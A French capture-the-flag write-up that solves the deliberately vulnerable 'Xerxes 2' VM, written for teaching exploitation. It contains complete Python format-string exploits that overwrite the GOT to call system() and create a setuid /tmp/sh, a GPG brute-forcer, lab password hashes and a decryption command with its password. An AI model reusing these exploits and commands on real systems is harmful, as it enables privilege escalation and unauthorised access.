# Solution du CTF Xerxes 2

Présentation
------------

[Xerxes 2](http://vulnhub.com/entry/xerxes-2,97/) est comme son nom l'indique le second de la série des *Xerxes*. [Le premier du nom](http://devloop.users.sourceforge.net/index.php?article72/solution-du-ctf-xerxes) était l'un des premiers CTF auquel je me suis attaqué parmi ceux disponibles sur *VulnHub*. Le challenge était intéressant mais il y avait un peu trop de guessing à mon goût, c'est donc avec une certaine appréhension que je me lançais sur le second opus.  

Première énigme
---------------

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-08-04 21:47 CEST
Nmap scan report for 192.168.1.32
Host is up (0.00018s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   1024 7f:0a:0d:81:50:3b:73:15:6b:9c:5e:09:a2:fc:82:91 (DSA)
|   2048 0d:eb:14:6d:b0:c5:eb:fc:84:2d:e8:a2:4e:9f:14:b4 (RSA)
|_  256 c1:ca:ae:c3:5d:7a:5b:9d:cf:27:a4:48:83:1e:01:84 (ECDSA)
80/tcp    open  http    lighttpd 1.4.31
|_http-title: xerxes2
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          45866/udp  status
|_  100024  1          51125/tcp  status
4444/tcp  open  krb524?
51125/tcp open  status  1 (RPC #100024)
1 service unrecognized despite returning data :
SF-Port4444-TCP:V=6.46%I=7%D=8/4%Time=53DFE348%P=x86_64-suse-linux-gnu%r(N
SF:ULL,3C48,"//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB\+AABnD0AAwYICw0QEhUXGhwfISQm
SF:KSsuMDM1ODo9QUNG\nSEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ\+hpKap
--- snip ---
SF:a6SC7tN1IX6btnETBj5oal90kVJLSTq1W\nU6a9Ro/Vrut3QoJpKZ6bmizc86BumpN1rQnA
SF:khKW4JOIVQ6q0th/lKggBGAGgLSsKgRLlO9qcv/z\ngsQVLLvqfCncgAGp63vV7uMMyHQFD
SF:BiFIHAAmYcCoAUAvCliDGiFV");
MAC Address: 00:0C:29:CA:B1:03 (VMware)
```

*Nmap* nous indique un service inconnu qui semble retourner du base64. On remarque aussi un serveur HTTP *lighttpd*.  

Sur ce dernier *dirb* ne trouve pas grand chose de bien intéressant :  

```plain
---- Scanning URL: http://192.168.1.32/ ----
+ http://192.168.1.32/.bash_history (CODE:200|SIZE:0)
+ http://192.168.1.32/~sys~ (CODE:403|SIZE:345)
```

Malgré la présence d'un fichier *.bash\_history* on ne trouve pas d'autres fichiers susceptibles d'être présents dans un dossier personnel.  

On aurait pu espérer des clés SSH mais le challenge aurait perdu en intérêt.  

Aussi le serveur semble renvoyer des erreurs 403 pour les noms de fichiers contenant *sys* ou ayant une extension *.inc*, sans doute l'effet d'un *.htaccess*.  

Je décide de passer au port 444 qui nous renvoie un texte base 64 :  

```plain
$ ncat 192.168.1.32 4444 > base64.txt
$ base64 -d base64.txt > raw.bin
$ file raw.bin
raw.bin: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural
```

Une fois décodé on a un fichier audio de 104ko avec une voix disant *"This is Xerxes. Why do you persist in your lonelyness ?"*  

En fond sonore on entend des sons comme ceux d'un modem et des modulations de fréquence laissant envisager qu'il y a de la stéganographie dans l'air.  

N'ayant pas vraiment le courage de persister (justement) dans cette voix (ou voie :), je décide de lancer un second scan de port. Une nouvelle habitude qui me vient [du CTF Hackademic RTB2](http://devloop.users.sourceforge.net/index.php?article77/solution-du-ctf-hackademic-rtb2) (je suis pris de convulsions quand j'en parle :p).  

Et effectivement on voit un nouveau port ouvert, preuve qu'un démon de *port-knocking* est à l'oeuvre (le fichier audio referme peut-être l'ordre des ports à *knocker*... ça je ne le saurais que plus tard en lisant la solution des autres participants dès que j'aurais publié la mienne).  

```plain
8888/tcp  open  http    Tornado httpd 2.3
|_http-methods: No Allow or Public header in OPTIONS response (status code 405)
|_http-title: IPython Dashboard
```

La bannière *Tornado* parlera peut-être aux développeurs Python. C'est un framework web simple et léger qui a fait parlé de lui fut un temps (maintenant on entend plus parler de *Flask*).  

Dessus tourne un *IPython*. C'est un interpréteur Python en interface web. Le but d'un tel logiciel est pédagogique (permettre l'apprentissage du langage en ligne).  

Mais est-ce que des limitations ont été mises en place pour empêcher l'accès aux fichiers, la mise sur écoute d'un port ou le lancement de programmes ? Pas vraiment !  

![Récupération de backdoor via wget](https://raw.githubusercontent.com/devl00p/blog/master/images/ipython_wget.png)

![Lancement de la backdoor en démon](https://raw.githubusercontent.com/devl00p/blog/master/images/ipython_tshd_launch.png)

Avec un serveur *tshd* lancé j'obtiens facilement un shell mais après un moment la connexion est coupée avec l'affichage d'un message (*Xerxes Guard, connexion non autorisée*). Toutefois le temps de connexion dont on dispose est amplement suffisant pour placer une clé SSH publique dans un nouveau fichier *authorized\_keys*. De cette façon on obtient une connexion *"légale"* non terminée par le programme de surveillance :  

```plain
$ ssh delacroix@192.168.1.32
Enter passphrase for key '/home/devloop/.ssh/id_rsa': 

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____   
`MM(   )P' 6MMMMb `MM 6MM `MM(   )P' 6MMMMb   6MMMMb\  6MMMMb  
 `MM` ,P  6M'  `Mb MM69 "  `MM` ,P  6M'  `Mb MM'    ` MM'  `Mb 
  `MM,P   MM    MM MM'      `MM,P   MM    MM YM.           ,MM 
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM' 
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M'    
  d' `MM. YM    d9 MM       d' `MM. YM    d9 L    ,MM ,M'      
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

delacroix@xerxes2:~$
```

Dans les processus on découvre que le serveur qui écoute sur le port 444 n'est rien d'autre qu'un *netcat* lancé en boucle :  

```plain
polito    2167  0.0  0.1   1936   568 ?        Ss   12:46   0:00 /bin/sh -c while true ; do nc -l -p 4444 < /home/polito/audio.txt ; done
```

Dans le home de l'utilisateur *delacroix* via lequel on est connecté on trouve un code C baptisé *bf.c*. Il s'agit d'un interpréteur [Brainfuck](https://fr.wikipedia.org/wiki/Brainfuck).  

Dans l'historique bash on retrouve des références à ce fichier :  

```bash
cd
ls -alh
/opt/bf "<<++++[>++++<-]>[>+++++>+++++>+++++>+++++>++>++++>++++>++++>+++++>++++>+++++<<<<<<<<<<<-]>---->->->----->>++++>+++++>+++++>>+++++>++#"
cp /media/politousb/bf.c .
nano bf.c
exit
passwd
exit
```

La commande *BrainFuck* présente dans l'historique fait afficher le message *"LOOK DEEPER"*.  

La version compilée de *bf.c* se trouve aussi sous */opt/bf* et est setuid *polito*.  

Au passage dans */etc/passwd* on trouve 3 utilisateurs :  

```plain
korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash
```

Seconde énigme
--------------

Le binaire setuid est dynamiquement lié et non strippé. Mais comme on dispose du code source on devrait se débrouiller :)  

```plain
/opt/bf: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
BuildID[sha1]=0x41b268c4f7d19d3a6ecf9ab948c42192c232c5d2, not stripped
```

Le fonctionnement du programme *bf* est assez simple : il interprète le code *BrainFuck* qu'il reçoit en argument.  

Dans le *main()* est défini un buffer de 30000 caractères qui sert de mémoire pour le *BrainFuck*.  

Les instructions de déplacement classiques de ce langage ésotérique (dont la virgule qui fait un *getchar*, le point qui fait un *putchar*) sont supportées.  

Par contre on remarque rapidement une nouvelle instruction vulnérable à une faille de chaîne de format :  

```c

   case '#':
    // new feature
    printf(buf);
    break;
```

Pour toute la partie exploitation de chaines de format je vous renvoie vers [mon tutoriel sur le sujet](http://devloop.users.sourceforge.net/index.php?article102/pwing-echo-exploitation-d-une-faille-de-chaine-de-format).  

Ici on va s'attarder un peu sur le fait que le programme est lié dynamiquement (au lieu d'être statique comme dans mon tutoriel).  

Via la commande *nm* on voit les symboles du binaire dont la *GOT* (*Global Offset Table*) :  

```plain
$ nm /opt/bf
08049948 d _DYNAMIC
08049a3c d _GLOBAL_OFFSET_TABLE_
0804878c R _IO_stdin_used
         w _ITM_deregisterTMCloneTable
         w _ITM_registerTMCloneTable
         w _Jv_RegisterClasses
08048938 r __FRAME_END__
08049944 d __JCR_END__
08049944 d __JCR_LIST__
08049a6c D __TMC_END__
08049a6c A __bss_start
08049a64 D __data_start
080484a0 t __do_global_dtors_aux
08049940 t __do_global_dtors_aux_fini_array_entry
08049a68 D __dso_handle
0804993c t __frame_dummy_init_array_entry
         w __gmon_start__
0804876a T __i686.get_pc_thunk.bx
08049940 t __init_array_end
0804993c t __init_array_start
08048700 T __libc_csu_fini
08048710 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08049a6c A _edata
08049a70 A _end
08048770 T _fini
08048788 R _fp_hw
08048350 T _init
08048400 T _start
080484ec T bf
08049a6c b completed.5730
08049a64 W data_start
08048430 t deregister_tm_clones
         U exit@@GLIBC_2.0
080484c0 t frame_dummy
         U getchar@@GLIBC_2.0
08048684 T main
         U memset@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U putchar@@GLIBC_2.0
08048460 t register_tm_clones
```

On voit également les fonctions utilisées par le binaire.  

Sur le système du challenge, l'[ASLR](http://fr.wikipedia.org/wiki/Address_space_layout_randomization) est activée. Par conséquent ça semble être une mauvaise idée de placer un shellcode dans l'environnement comme on avait pu le faire sur le CTF *Hell*.  

Du coup ou peut-on le placer ? On peut se servir de l'instruction virgule du *BrainFuck* pour placer le shellcode dans le buffer (octet par octet). Il ne reste plus qu'à trouver un moyen de faire sauter le programme vers le buffer.  

Cela est possible grâce à l'outil [ROPgadget](http://shell-storm.org/project/ROPgadget/) qui m'a trouvé un gadget *pop-ret* présent dans le segment de code. Ainsi :  

* On écrase l'adresse de *printf* (ou *exit*) dans la *GOT* (de manière similaire à l'écrasement de *\_\_fini\_array\_start* sur le CTF *Hell*)
* L'adresse qui vient écraser est celle de l'instruction *pop-ret* trouvée dans le code de *bf* qui permet de retirer un mot sur la pile et de sauter sur le buffer
* On provoque ensuite un nouvel appel à *printf* (ou *exit*) ce qui provoque la suite d'instructions voulue (l'exécution du shellcode)

Seulement au moment où le programme saute sur les instructions écrites dans le buffer : *SIGSEV* !  

La stack n'est pas exécutable... pas besoin d'aller chercher plus loin.  

Grat-grat de la tête... Comment va t'on faire ? Le binaire dispose de quelques instructions pour du *ROP* ([Return Object Programming](http://en.wikipedia.org/wiki/Return-oriented_programming)) mais trop peu pour faire quelque chose d'intéressant. En particulier le programme étant linké, il ne dispose pas d'instructions *int 0x80*.  

Un ret-into-libc ? La fonction *system* n'est pas utilisée et les fonctions affichées par *nm* ne vont pas vraiment nous être utiles.  

Sur [un document venant de .aware network](http://www.exploit-db.com/papers/13143/) quelqu'un affirmait qu'il était possible de placer le shellcode dans une section comme *DYNAMIC*... mais le résultat n'était pas meilleur.  

Le document qui m'a le plus aidé fut [celui de *danigargru* intitulé *GOT Dereferencing / Overwriting - ASLR/NX Bypass (Linux)*](http://danigargu.blogspot.com.es/2013/02/got-dereferencing-overwriting-aslrnx.html).  

Il explique dans ce document qu'une fois la libc chargée en mémoire, la distance qui sépare deux fonctions (toujours les même) ne change jamais même avec l'*ASLR* activée. Par conséquent si on obtient l'adresse de *printf* on est en mesure de calculer celle de *system* :)  

Mais avant de se lancer dans l'exploitation, petite interlude sur le rôle de la *Global Offset Table*.  

Au lancement d'un programme compilé dynamiquement, le système doit pouvoir déterminer quelles librairies sont requises par le programme et à quelles fonctions et objets de ces librairies il va accéder.  

Pour cela le binaire ELF contient différentes sections contenant les noms des librairies et de ces fonctions. Tout cela est visible avec des utilitaires comme *ldd* et *nm*.  

Le binaire dispose d'une table (la GOT) qui est vide mais que le système d'exploitation va remplir quand le programme est chargé en mémoire à son lancement. C'est le système qui se charge de charger en mémoire les librairies requises, de résoudre les adresses des symboles et de remplir la GOT dans la mémoire du programme.  

Ci-dessous vous trouverez des exemples concrets avec gdb mais avant il y a deux éléments à savoir concernant la situation actuelle.  

Premièrement quand vous déboguez un programme setuid, les privilèges sont droppés. *Captain Obvious* dirait que sinon ce serait la porte ouverte à toutes les portes dérobées (merci *Captain Obvious* !)  

Deuxièmement quand l'*ASLR* est activée sur le système, *gdb* la désactive par défaut pour le programme débogué. C'est pratique car ça permet de retrouver ses objets aux même adresses d'une session à une autre mais ce n'est pas toujours ce que l'on souhaite. Tout ça se paramètre via la commande *set disable-randomization (on/off)*.  

Voyons comment est résolu le symbole *printf* avant de lancer l'exécutable :  

```plain
(gdb) p printf
$1 = {<text variable, no debug info>} 0x8048390 <printf@plt>

(gdb) x/i 0x8048390
   0x8048390 <printf@plt>:	jmp    *0x8049a48

(gdb) x/x 0x08049a48
0x8049a48 <printf@got.plt>:	0x08048396

(gdb) x/2i 0x08048396
   0x8048396 <printf@plt+6>:	push   $0x0
   0x804839b <printf@plt+11>:	jmp    0x8048380

(gdb) x/2i 0x8048380
   0x8048380:	pushl  0x8049a40
   0x8048386:	jmp    *0x8049a44

(gdb) x/x 0x8049a44
0x8049a44 <_GLOBAL_OFFSET_TABLE_+8>:	0x00000000
```

Pour accéder finalement à *printf* le binaire doit passer par tout une série de *jmp* qui amène à la *GOT* qui est pour le moment vide.  

Suivons le même chemin une fois le programme chargé mais avant que *printf* n'ait été appelé une première fois (breakpoint sur *main*) :  

```plain
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7eb8f50 <__printf>

(gdb) x/i 0x8048390
   0x8048390 <printf@plt>:	jmp    *0x8049a48

(gdb) x/x 0x08049a48
0x8049a48 <printf@got.plt>:	0x08048396

(gdb) x/2i 0x08048396
   0x8048396 <printf@plt+6>:	push   $0x0
   0x804839b <printf@plt+11>:	jmp    0x8048380

(gdb) x/2i 0x8048380
   0x8048380:	pushl  0x8049a40
   0x8048386:	jmp    *0x8049a44

(gdb) x/x 0x8049a44
0x8049a44 <_GLOBAL_OFFSET_TABLE_+8>:	0xb7ff59b0
```

Cette fois la *GOT* est remplie, et le symbole est résolu directement à *0xb7eb8f50* qui est l'adresse de *printf* dans la *libc* chargée en mémoire.  

Et quel est l'état une fois que *printf* a été appelé ?  

```plain
(gdb) p printf
$1 = {<text variable, no debug info>} 0xb7eb8f50 <__printf>

(gdb) x/i 0x8048390
   0x8048390 <printf@plt>:	jmp    *0x8049a48

(gdb) x/x 0x08049a48
0x8049a48 <printf@got.plt>:	0xb7eb8f50

(gdb) x/2i 0x08048396
   0x8048396 <printf@plt+6>:	push   $0x0
   0x804839b <printf@plt+11>:	jmp    0x8048380

(gdb) x/2i 0x8048380
   0x8048380:	pushl  0x8049a40
   0x8048386:	jmp    *0x8049a44

(gdb) x/x 0x8049a44
0x8049a44 <_GLOBAL_OFFSET_TABLE_+8>:	0xb7ff59b0
```

Ici le chemin est encore plus court car l'adresse est aussi placée dans la *PLT* (*Procedure Linkage Table*).  

L'adresse que l'on va écraser est celle qui se trouve à *0x8049a48*.  

On peut l'obtenir plus rapidement en affichant les rellocations du programme avec *objdump* :  

```plain
$ objdump -R bf

bf:     format de fichier elf32-i386                                                                                                                                                                           

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049a38 R_386_GLOB_DAT    __gmon_start__
08049a48 R_386_JUMP_SLOT   printf
08049a4c R_386_JUMP_SLOT   getchar
08049a50 R_386_JUMP_SLOT   __gmon_start__
08049a54 R_386_JUMP_SLOT   exit
08049a58 R_386_JUMP_SLOT   __libc_start_main
08049a5c R_386_JUMP_SLOT   memset
08049a60 R_386_JUMP_SLOT   putchar
```

Exploitation de la chaine de format (1er cas : brute-force ASLR)
----------------------------------------------------------------

Récapitulatif de notre objectif : écraser l'adresse de *printf* dans la *GOT* par celle de *system* en utilisant la technique de *danigargru*.  

Ma première idée pour récupérer l'adresse de *printf* était d'utiliser *%s* en mettant l'adresse de la *GOT* sur la pile et utiliser un formateur de position pour l'afficher (donc *"\0x48\x9a\x04\x08%16$s"*).  

Seulement comme j'ai déjà pu l'évoquer sur mon writeup de *Hell*, communiquer avec un programme est parfois plus compliqué que ce que l'on pense.  

Ici le programme */opt/bf* ne flush jamais les données affichées. Du coup malgré tous mes essais, impossible de récupérer l'output du *%s* même si le programme se bloque ensuite sur un appel à *getchar*. Les données de sortie ne sont retournée qu'à la fin de l'exécution du programme :(  

J'ai tenté de trouver une solution alternative mais arrivé à cours d'idée j'ai choisi de bruteforcer l'adresse de *system*.  

Le principe d'une attaque brute-force sur l'*ASLR* est connu de longue date mais je ne savais pas dans quel mesure cela serait effectif.  

Avec *gdb* on peut voir que pour chaque lancement du programme l'adresse de *system* change mais conserve tout de même certains octets (au début et à la fin).  

Notez que le fait que l'adresse de *system* se termine par un octet nul n'est sans doute pas un hasard mais une protection contre les attaques *ret-into-libc*.  

```plain
(gdb) set disable-randomization off
(gdb) p system
$2 = {<text variable, no debug info>} 0xb76ae000 <system>
...
(gdb) p system
$3 = {<text variable, no debug info>} 0xb7617000 <system>
...
(gdb) p system
$4 = {<text variable, no debug info>} 0xb7645000 <system>
```

Pour me faire une idée du temps que le brute force de l'*ASLR* prendrait j'ai créé un simple programme C qui fait un *printf("%p", system)*.  

Par dessus j'ai créé un script Python qui lance le programme en boucle et compte le nombre de lancements effectués avant d'obtenir une adresse déjà affichée.  

Et le résultat est plus que positif : en moyenne une vingtaine de tentatives suffit à retomber sur une précédente adresse.  

Pourquoi c'est aussi simple ? Principalement parce que le système est un 32 bits et que la VM n'a que 512 Mo de RAM ce qui réduit les possibilités de randomisation (l'espace d'adressage est suffisamment petit).  

Par conséquent l'exploit suivant effectue simplement une boucle en utilisant une adresse pour *system* obtenue lors de l'un des essais (*0xb762a000*).  

Le payload effectue différentes commandes dont la dernière est la création d'un fichier */tmp/hacked.txt* ce qui nous permet de déterminer si l'exploit a fonctionné.  

```python
import subprocess
import struct
import os

ret = 0x08048683
ret = 0x08048682
printf_got = 0x08049a48
system = 0xb762a000

def bf_print(string):
        l = len(string)
        # ask for the string on stdin
        result = ">".join([","]*len(string)) + "#"
        return result

def bf_print_rewind(string):
        return bf_print(string) + "<" * (len(string)-1)

addresses = struct.pack("I", printf_got)
addresses += struct.pack("I", printf_got + 1)
addresses += struct.pack("I", printf_got + 2)
addresses += struct.pack("I", printf_got + 3)

def split_addr(n):
    result = []
    n1 = n & 0xFF
    n2 = (n >> 8) & 0xFF
    n3 = (n >> 16) & 0xFF
    n4 = (n >> 24) & 0xFF
    while n1 <= 16:
        n1 += 0x100
    result.append(n1 - 16)
    while n2 <= n1:
        n2 += 0x100
    result.append(n2 - n1)
    while n3 <= n2:
        n3 += 0x100
    result.append(n3 - n2)
    while n4 <= n3:
        n4 += 0x100
    result.append(n4 - n3)
    return result

values = split_addr(system)

attack_fmt = "%{:03d}c%016$hhn%{:03d}c%017$hhn%{:03d}c%018$hhn%{:03d}c%019$hhn012345678912".format(values[0], values[1], values[2], values[3])
attack_fmt = addresses + attack_fmt

cmd = "mkdir /home/polito/.ssh; cp /tmp/authorized_keys /home/polito/.ssh/;touch /tmp/hacked.txt;"

fd = open("data.raw", "w")
fd.write(attack_fmt)
fd.write(cmd)
fd.close()

arg =  bf_print_rewind(attack_fmt) + bf_print(cmd)

fd = open("data.raw", "r")

while True:
        try:
                output = subprocess.check_output(["/opt/bf", arg], stdin=fd)
        except subprocess.CalledProcessError:
                pass
        fd.seek(0)
        if os.path.isfile("/tmp/hacked.txt"):
                print "[*] Success !"
                break

fd.close()
```

L'exécution de cet exploit ne prend que quelques secondes. Ce n'est pas parfait mais on obtient les droits de l'utilisateur *polito* comme attendu.  

Exploitation de la chaîne de format (2nd cas : dialogue avec mon tty)
---------------------------------------------------------------------

Après avoir complété le challenge, j'ai décidé de reprendre l'attaque du binaire */opt/bf*. A force de recherche j'ai trouvé un exemple de code pas très beau mais fonctionnel pour dialoguer octet après octet avec le programme.  

Le principe est de lancer le programme dans un *pty* en code canonique ([voir mon article sur les terminaux](http://devloop.users.sourceforge.net/index.php?article46/pseudo-terminaux-portes-derobees-telnet-et-tunneling)).  

De cette façon on peut complètement automatiser l'exploitation du binaire qui premièrement récupère la distance entre *printf* et *system*, deuxièmement obtient l'adresse de *printf* via *%s*, troisièmement calcule l'adresse courante de *system*, et finalement écrase la *GOT* et exécute notre payload :  

```python
import tty
import pty
import termios
import os
import sys
import struct
import subprocess
import time

real_printf = 0

def bf_print(string):
        l = len(string)
        # ask for the string on stdin
        result = ">".join([","]*len(string)) + "#"
        return result

def bf_print_rewind(string):
        return bf_print(string) + "<" * (len(string)-1)

def split_addr(n):
    result = []
    n1 = n & 0xFF
    n2 = (n >> 8) & 0xFF
    n3 = (n >> 16) & 0xFF
    n4 = (n >> 24) & 0xFF
    while n1 <= 16:
        n1 += 0x100
    result.append(n1 - 16)
    while n2 <= n1:
        n2 += 0x100
    result.append(n2 - n1)
    while n3 <= n2:
        n3 += 0x100
    result.append(n3 - n2)
    while n4 <= n3:
        n4 += 0x100
    result.append(n4 - n3)
    return result

print "[i] devloop exploit for Xerxes 2 /opt/bf - fully automated"
printf_got = 0
print "[*] Getting printf address in GOT with objdump"
output = subprocess.check_output(["objdump", "-R", "/opt/bf"])
for line in output.split("\n"):
    if line.endswith("printf"):
        printf_got = int(line.split()[0], 16)
        print "[*] GOT address for printf is", hex(printf_got)
if not printf_got:
    print "[!] Can't get printf GOT address"
    sys.exit()

print "[*] Launching test process to get distance between printf and system..."
args = ["gdb", "-q", "/opt/bf"]
p = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
output = p.communicate("set disable-randomization off\nb main\nr\np printf\np system\nkill\nquit")[0]

printf_addr = 0
system_addr = 0

for line in output.split("\n"):
    if "printf" in line:
        printf_addr = int(line.split("0x")[1].split()[0], 16)
        print "[*] printf is at", hex(printf_addr)
    elif "system" in line:
        system_addr = int(line.split("0x")[1].split()[0], 16)
        print "[*] system is at", hex(system_addr)

if not (printf_addr or system_addr):
    print "[!] Can't resolve functions addresses :("
    sys.exit()

offset = int(system_addr - printf_addr)
print "[*] Offset to system is", offset

addresses = struct.pack("I", printf_got)
addresses += struct.pack("I", printf_got + 1)
addresses += struct.pack("I", printf_got + 2)
addresses += struct.pack("I", printf_got + 3)

# Evil command *manicial laugh*
command = "cp /bin/sh /tmp/sh;chmod ug+s /tmp/sh;touch /tmp/gotit.txt;#"
print_string = addresses + "%16$sENDMARK"
# same length as the attack string but just does nothing
pattern_string = addresses + "%{:03d}c%016$.8x%{:03d}c%017$.8x%{:03d}c%018$.8x%{:03d}c%019$.8x012345678912".format(0, 0, 0, 0)

# Calculating the brainfuck string with the used pattern
arg = bf_print_rewind(print_string) + bf_print_rewind(pattern_string) + bf_print(command)

# This is not a test of the Emergency Broadcast System ! This is the real thing !!
print "[*] Launching the process for attack..."

child_pid, child_fd = pty.fork()

if not child_pid: # child process
  os.execv("/opt/bf", ["bf", arg])

attr = termios.tcgetattr(child_fd)
attr[3] = attr[3] & ~termios.ECHO
termios.tcsetattr(child_fd, termios.TCSANOW, attr)
tty.setcbreak(child_fd)

os.write(child_fd, print_string)
s = ""
while True:
  c = os.read(child_fd, 1)
  if c ==  "":
    sys.exit()
  s += c
  if s.endswith("ENDMARK"):
    real_printf = struct.unpack("I", s[16:20])[0]
    print "[*] printf is at", hex(real_printf)
    break

if real_printf:
    system_addr = int(real_printf + offset)
    print "[*] system must be at", hex(system_addr)

values = split_addr(system_addr)
attack_fmt = "%{:03d}c%016$hhn%{:03d}c%017$hhn%{:03d}c%018$hhn%{:03d}c%019$hhn012345678912".format(values[0], values[1], values[2], values[3])
attack_fmt = addresses + attack_fmt

print "[*] Overwriting printf address with system address in GOT"
os.write(child_fd, attack_fmt)

s = ""
while True:
  c = os.read(child_fd, 1)
  if c ==  "":
    sys.exit()
  s += c
  if s.endswith("12345678912"):
    break

print "[*] Putting our command"
os.write(child_fd, command)

time.sleep(0.5)

if os.path.isfile("/tmp/gotit.txt"):
    print "[*] Enjoy your shell with euid polito :)"
    subprocess.call(["/tmp/sh"])
else:
    print "[!] Ouch, something wen't wrong... Try harder"
```

Il ne reste alors qu'à mettre les pieds sous la table :  

```plain
delacroix@xerxes2:~$ python exploit.py
[i] devloop exploit for Xerxes 2 /opt/bf - fully automated
[*] Getting printf address in GOT with objdump
[*] GOT address for printf is 0x8049a48
[*] Launching test process to get distance between printf and system...
[*] printf is at 0xb75d3f50L
[*] system is at 0xb75c6000L
[*] Offset to system is -57168
[*] Launching the process for attack...
[*] printf is at 0xb76abf50L
[*] system must be at 0xb769e000L
[*] Overwriting printf address with system address in GOT
[*] Putting our command
[*] Enjoy your shell with euid polito :)
$ id
uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
```

POUNED !  

Troisème énigme
---------------

On trouve dans le dossier personnel de *polito* un fichier PDF particulier :  

```plain
$ file polito.pdf
polito.pdf: DOS/MBR boot sector
```

Avec *hexdump* on s’aperçoit que le fichier contient deux headers PDF, l'un avec le texte suivant :  

```plain
--WARNING--
Unauthorized file access will be reported..
XERXES wishes you a most productive day
```

et l'autre qui s'affiche depuis un lecteur PDF quelconque (ex: *Okular*) et contient un *QRcode* [en référence à Xerxes 1](http://devloop.users.sourceforge.net/index.php?article72/solution-du-ctf-xerxes).  

Mais il n'y a rien à voir du côté du *QRcode* qui correspond seulement au texte *"XERXES is watching..."*  

L'image du code est en grayscale et l'ancien CTF cachait des données dans le canal alpha qui n'existe pas ici.  

On trouve aussi un fichier *dump.gpg* et comme il n'y a aucune paire de clé dans le dossier *.gnupg* on devine que ce fichier est chiffré avec un algo symétrique.  

Étrangement l'entête de secteur de boot dans le PDF ne m'a pas choqué plus que ça (sans doute parce que j'avais vu un cas similaire plus tôt dans un article... mais comble de l'idiotie ça devait être un writeup pour un autre CTF).  

Au lieu de m'y intéresser j'ai écrit un brute-forceur *GPG* qui utilise les options *-d* (*decrypt*), *--batch* et *--passphrase* de gnupg :  

```python
import subprocess
import os

i = 0
fd = open("rockyou.txt")
null = open("/dev/null", "w")

while True:
    line = fd.readline()
    if not line:
        break
    word = line.strip()
    retcode = subprocess.call(["gpg", "-d", "--output", "dump", "--batch", "--passphrase", word, "dump.gpg"],
            stderr=null)
    if i == 10000:
        print "[-] Testing", word
        i = 0
    i += 1
    if retcode != 2 or os.path.isfile("dump"):
        print "[*] Found password", word
        break

fd.close()
null.close()
```

On obtient un output de ce style (comptez plusieurs heures) :  

```plain
--- snip ---
[-] Testing adesan
[-] Testing ZOEY11
[-] Testing SmurfSamFrodo
[-] Testing RANDY04
[-] Testing Mickie76
[-] Testing LITTLEP
[*] Found password Janus
```

Sauf que le fichier dump de 43Mo déchiffré via le mot de passe *Janus* semble contenir ni plus ni moins des données aléatoires.  

Un coup de chance (ou de malchance) en fait...  

Après avoir retrouvé mes esprits je lance le PDF directement dans *QEMU* :  

```plain
$ qemu-system-i386 polito.pdf
```

![QEMU lancement PDF secteur de boot](https://raw.githubusercontent.com/devl00p/blog/master/images/qemu.png)

Le fichier dump déchiffré avec cette clé contient des données plus réalistes mais sans réelle organisation : il doit s'agir d'un dump mémoire.  

Notamment en faisant une recherche dans le dump on trouve des hashs :  

![Dump mémoire contenant les hashs des mots de passe](https://raw.githubusercontent.com/devl00p/blog/master/images/dump_clear.png)

```plain
root:$6$qG30pAPS$2KbWjBGDMia6UVxbQfZ4M.K9ZU6ya80lrx0FsSW0kIOXxODW6vjHpjBIfbS5OmC0R3y7cAkCtvAxCqLxcXjlH/:16195:0:99999:7
korenchkin:$6$WjgI1TzN$u8gOd9v8jR2ffDGWGOwtxc58yczo5fsZy40TM84pct.iSmlwRA4yV3.tdPnn5b8AWiQ.tnqUeInSQqkVEI2z3.:16221:0:99999:7:::
polito:$6$ZZse8bfp$Etf3yb4xeswzZhS.VVQ1admvpXXuBQjTabwaT9qitZ0NDDZICRlsBI.KtwNTy7MgZuLw9l7h7WS7MAwJ96t9X0:16195:0:99999:7:::
delacroix:$6$BuJUKaXI$YLabcN56.SjHYe71yUa5KArlafGaV3wXYVoXzbtJacbP77h193/HbiXxP6IAHc5Eiqz8F65xnAzqpR0K0FTje.:16195:0:99999:7:::
```

Mais ces derniers ne sont pas en ceux en cours :(  

Sur le système de fichier se trouve un fichier chiffré via *openssl* appartenant à *korenchkin* (le contenu du fichier commence par *Salted\_\_* ce qui est propre à *openssl*).  

```plain
polito@xerxes2:~$ ls /opt/backup/ -l
total 12
-rw-r--r-- 1 korenchkin korenchkin 10272 Jul 16 11:24 korenchkin.tar.enc
```

Du coup on fait une recherche sur *openssl* dans le dump et on fini par trouver :  

```bash
openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in korenchkin.tar -out korenchkin.tar.enc
```

La commande inverse est donc :  

```bash
openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu  -in korenchkin.tar.enc -out korenchkin.tar
```

Cette fois on a une paire de clés SSH qui nous permettent de devenir *korenchkin* :  

```plain
$ tar tvf korenchkin.tar 
-rw------- korenchkin/korenchkin 1675 2014-07-16 20:17 .ssh/id_rsa
